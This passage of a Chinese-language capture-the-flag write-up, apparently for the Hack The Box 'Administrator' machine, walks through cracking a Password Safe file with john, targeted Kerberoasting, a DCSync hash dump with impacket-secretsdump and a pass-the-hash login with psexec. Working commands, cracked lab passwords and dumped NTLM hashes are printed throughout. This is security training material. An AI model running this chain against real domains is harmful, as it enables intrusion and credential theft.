+<p><img loading="lazy" decoding="async" width="639" height="505" src="../legacy/uploads/2025/04/1745033219-image.png" alt="" class="wp-image-1251" srcset="../legacy/uploads/2025/04/1745033219-image.png 639w, ../legacy/uploads/2025/04/1745033219-image-300x237.png 300w" sizes="auto, (max-width: 639px) 100vw, 639px" /> </figure></p>
+<p>benjamin:Password123!登录FTP服务成功，并在目录下发现一个Backup.psafe3文件，下载下来。</p>
+<p>没见过这个psafe3文件是什么，在网上搜索一番后得知, psafe3是一个保管密码的数据库,并且文件被一个master password加密：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="252" src="../legacy/uploads/2025/04/1745033454-image-1024x252.png" alt="" class="wp-image-1253" srcset="../legacy/uploads/2025/04/1745033454-image-1024x252.png 1024w, ../legacy/uploads/2025/04/1745033454-image-300x74.png 300w, ../legacy/uploads/2025/04/1745033454-image-768x189.png 768w, ../legacy/uploads/2025/04/1745033454-image.png 1333w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>可以使用我们万能的john来dump这个文件的master password，并尝试破解：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: bash; title: ; notranslate" title="">
+pwsafe2john Backup.psafe3 &gt; pshash
+cat pshash                  
+Backu:$pwsafe$*3*4ff588b74906263ad2abba592aba35d58bcd3a57e307bf79c8479dec6b3149aa*2048*1a941c10167252410ae04b7b43753aaedb4ec63e3f18c646bb084ec4f0944050
+john --wordlist=/usr/share/wordlists/rockyou.txt pshash
+Using default input encoding: UTF-8
+Loaded 1 password hash (pwsafe, Password Safe &#x5B;SHA256 128/128 AVX 4x])
+No password hashes left to crack (see FAQ)
+john --wordlist=/usr/share/wordlists/rockyou.txt pshash
+john --show pshash                                     
+Backu:tekieromucho
+1 password hash cracked, 0 left
+</pre>
+</div>
+<p>得到密码，<strong>tekieromucho</strong>。使用pwsafe打开文件并输入密码：<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="969" height="392" src="../legacy/uploads/2025/04/1745033808-image.png" alt="" class="wp-image-1259" srcset="../legacy/uploads/2025/04/1745033808-image.png 969w, ../legacy/uploads/2025/04/1745033808-image-300x121.png 300w, ../legacy/uploads/2025/04/1745033808-image-768x311.png 768w" sizes="auto, (max-width: 969px) 100vw, 969px" /> </figure> <figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="546" height="524" src="../legacy/uploads/2025/04/1745033873-image.png" alt="" class="wp-image-1260" srcset="../legacy/uploads/2025/04/1745033873-image.png 546w, ../legacy/uploads/2025/04/1745033873-image-300x288.png 300w" sizes="auto, (max-width: 546px) 100vw, 546px" /></figure></p>
+<p>登录后右键可以复制密码到粘贴板, 三人密码分别是:</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+Alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
+Emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
+Emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
+</pre>
+</div>
+<p>在bloodhound里查看这三人分别有什么权限，发现Emily对Ethan有GenericWrite权限：<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="942" height="209" src="../legacy/uploads/2025/04/1745034203-image.png" alt="" class="wp-image-1263" srcset="../legacy/uploads/2025/04/1745034203-image.png 942w, ../legacy/uploads/2025/04/1745034203-image-300x67.png 300w, ../legacy/uploads/2025/04/1745034203-image-768x170.png 768w" sizes="auto, (max-width: 942px) 100vw, 942px" /> </figure></p>
+<p>而Ethan对DC有DCSync权限：<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="485" src="../legacy/uploads/2025/04/1745034247-image-1024x485.png" alt="" class="wp-image-1264" srcset="../legacy/uploads/2025/04/1745034247-image-1024x485.png 1024w, ../legacy/uploads/2025/04/1745034247-image-300x142.png 300w, ../legacy/uploads/2025/04/1745034247-image-768x364.png 768w, ../legacy/uploads/2025/04/1745034247-image-1536x728.png 1536w, ../legacy/uploads/2025/04/1745034247-image.png 1760w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<ul class="wp-block-list">
+  <li>
+    当用户A对用户B有GenericWrite权限时，则A可以修改B的SPN属性，实施Targeted-kerberoasting Attack。
+  </li>
+</ul>
+<ul class="wp-block-list">
+  <li>
+    当用户A对DC有DCSync权限时，则A可以模拟域控制器向其他 DC 请求复制Password Hash，也就是可以发起 DCSync Attack，提取域内所有账户的 NTLM Hash.
+  </li>
+</ul>
+<p>使用<a href="https://github.com/ShutdownRepo/targetedKerberoast" target="_blank"  rel="nofollow" >targetedKerberoast</a>对ethan发起攻击:<figure class="wp-block-image size-large"></p>
+<p><img loading="lazy" decoding="async" width="1024" height="301" src="../legacy/uploads/2025/04/1745034741-image-1024x301.png" alt="" class="wp-image-1268" srcset="../legacy/uploads/2025/04/1745034741-image-1024x301.png 1024w, ../legacy/uploads/2025/04/1745034741-image-300x88.png 300w, ../legacy/uploads/2025/04/1745034741-image-768x226.png 768w, ../legacy/uploads/2025/04/1745034741-image-1536x451.png 1536w, ../legacy/uploads/2025/04/1745034741-image.png 1896w" sizes="auto, (max-width: 1024px) 100vw, 1024px" /> </figure></p>
+<p>成功获取到了ethan的SPN。</p>
+<p><em>PS：如果报错[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)，则是因为本机与DC之间的时间差过大，Kerberos认证对时间差要求非常严格。可以使用<strong>ntpdata ip</strong>来同步与DC的时间差。</em></p>
+<p><em>PS：<a href="https://github.com/ShutdownRepo/targetedKerberoast" target="_blank"  rel="nofollow" >targetedKerberoast</a>.py 跟impacket-GetUserSPNs功能大致一样，但它会尝试对可写入SPN的对象写入SPN属性后，再获取SPN。</em></p>
+<p>用john破解ethan的SPN后获取密码：<strong>limpbizkit</strong></p>
+<p>因为ethan对DC有DCSync权限，则可以用Impacket-secresdump来直接dump域内密码：</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+impacket-secretsdump Administrator/ethan:&#039;limpbizkit&#039;@10.10.11.42
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+<p>[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
+[<em>] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[</em>] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
+administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
+administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
+administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
+administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
+administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
+DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
+[<em>] Kerberos keys grabbed
+&hellip;&hellip;.
+[</em>] Cleaning up&hellip;
+</pre></p>
+</div>
+<p>获取Administrator的NTLM hash，用impacket-psexec尝试登录:</p>
+<div class="wp-block-syntaxhighlighter-code ">
+  <pre class="brush: plain; title: ; notranslate" title="">
+impacket-psexec -hashes :3dc553ce4b9fd20bd016e098d2d2fd2e Administrator/Administrator@10.10.11.42                  
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+<p>[<em>] Requesting shares on 10.10.11.42&hellip;..
+[</em>] Found writable share ADMIN$
+[<em>] Uploading file PPzOqLvu.exe
+[</em>] Opening SVCManager on 10.10.11.42&hellip;..
+[<em>] Creating service ecOM on 10.10.11.42&hellip;..
+[</em>] Starting service ecOM&hellip;..
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.2762]
+(c) Microsoft Corporation. All rights reserved.</p>
+<p>C:\Windows\system32&gt; whoami
+nt authority\system
+</pre></p>
+</div>
+<h2 id="user-and-root-flags">User and Root flags
+</h2><p>在C:\Users\Emily\Desktop 下发现user flag:<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="405" height="235" src="../legacy/uploads/2025/04/1745035376-image.png" alt="" class="wp-image-1276" srcset="../legacy/uploads/2025/04/1745035376-image.png 405w, ../legacy/uploads/2025/04/1745035376-image-300x174.png 300w" sizes="auto, (max-width: 405px) 100vw, 405px" /> </figure></p>
+<p>在C:\users\Administrator\Desktop 下发现root flag:<figure class="wp-block-image size-full"></p>
+<p><img loading="lazy" decoding="async" width="363" height="225" src="../legacy/uploads/2025/04/1745035426-image.png" alt="" class="wp-image-1277" srcset="../legacy/uploads/2025/04/1745035426-image.png 363w, ../legacy/uploads/2025/04/1745035426-image-300x186.png 300w" sizes="auto, (max-width: 363px) 100vw, 363px" /> </figure></p>
+<p>Happy Hacking.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            Last updated on Apr 20, 2025 02:00 UTC
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/htb-flight-Writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2025/05/1748606734-a7af9035e5089332dfbfeb328d663f3e-150x150.webp" loading="lazy" data-key="" data-hash="/legacy/uploads/2025/05/1748606734-a7af9035e5089332dfbfeb328d663f3e-150x150.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-Flight-Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb-underpass-Writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2025/05/1747065644-456a4d2e52f182847fb0a2dba0420a44.webp" loading="lazy" data-key="" data-hash="/legacy/uploads/2025/05/1747065644-456a4d2e52f182847fb0a2dba0420a44.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-UnderPass-Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb-bashed-Writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2025/04/1745047500-bashed-150x150.webp" loading="lazy" data-key="" data-hash="/legacy/uploads/2025/04/1745047500-bashed-150x150.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-Bashed-Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb-season-6-monitored/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2024/08/1724822083-monitor-150x150.webp" loading="lazy" data-key="" data-hash="/legacy/uploads/2024/08/1724822083-monitor-150x150.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-Season 6-Monitored</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/htb-retired-magic-Writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/legacy/uploads/2024/08/1724907410-73eebbbdfbbfd46258ea2ae7e52d9479-150x150.webp" loading="lazy" data-key="" data-hash="/legacy/uploads/2024/08/1724907410-73eebbbdfbbfd46258ea2ae7e52d9479-150x150.webp"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HTB-Retired-Magic-Writeup</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 Jowhite
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.c360ad02a41a6ed7f0240895667de2af6b7bfd79a8c71b3ed3008667720bb9d1.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<style>
+     
+    :root {
+        --article-font-family: "Merriweather", var(--base-font-family);
+    }
+</style>
+
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Merriweather:wght@400;700&display=swap";
+    
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+    
+        document.head.appendChild(customFont);
+    }());
+</script>
+    </body>
+</html>
